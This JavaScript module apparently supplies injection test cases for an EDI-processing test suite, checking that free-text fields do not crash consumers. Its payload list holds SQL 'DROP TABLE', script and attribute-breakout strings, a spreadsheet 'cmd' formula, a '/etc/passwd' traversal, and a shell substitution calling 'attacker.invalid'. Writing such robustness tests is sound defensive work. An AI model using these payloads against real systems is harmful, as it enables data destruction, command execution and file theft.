// Payload injection inside data elements. These are not delimiter bugs; they
// are the strings that break downstream consumers (log pipelines, CSV exports,
// web UIs, SQL builders) when an EDI value is interpolated without escaping.

import { caseOf, valid, withTarget } from './shared.mjs';

const payloads = [
  ['json', 'SYN"}; process.exit(1); {"x":"', 'JSON-breaking payload in a free-text field.'],
  ['sql', "SYN'); DROP TABLE claims;--", 'SQL injection payload in a free-text field.'],
  ['script', 'SYN<script>alert(1)</script>', 'HTML script payload in a free-text field.'],
  ['attribute-breakout', 'SYN" onmouseover="alert(1)', 'HTML attribute breakout payload.'],
  ['log-forge', 'SYN\nERROR 2026-01-01 00:00:00 forged log line', 'Newline plus a forged log entry inside a field.'],
  ['csv-formula', "SYN=cmd|' /C calc'!A0", 'Spreadsheet formula injection payload.'],
  ['path-traversal', 'SYN../../../../etc/passwd', 'Path traversal payload in a field.'],
  ['shell-substitution', 'SYN$(curl attacker.invalid) `id`', 'Shell command substitution payload.'],
  ['template', 'SYN{{7*7}} ${7*7}', 'Template expression payload.'],
  ['ansi-escape', 'SYN\u001b[31m\u001b[2J', 'ANSI escape sequences for terminal injection.'],
  ['zero-width', 'SYN\u200bTHETIC\u200dPAYER', 'Invisible zero-width characters inside a field.'],
  ['unicode-confusable', 'SYNTHETIC\u0410\u0415PAYER', 'Cyrillic homoglyphs that render like Latin letters.'],
];

export function injectionCases() {
  return payloads.map(([id, payload, description]) =>
    caseOf(`injection.${id}`, 'injection', 'no-crash', description, () => withTarget(valid(), payload))
  );
}
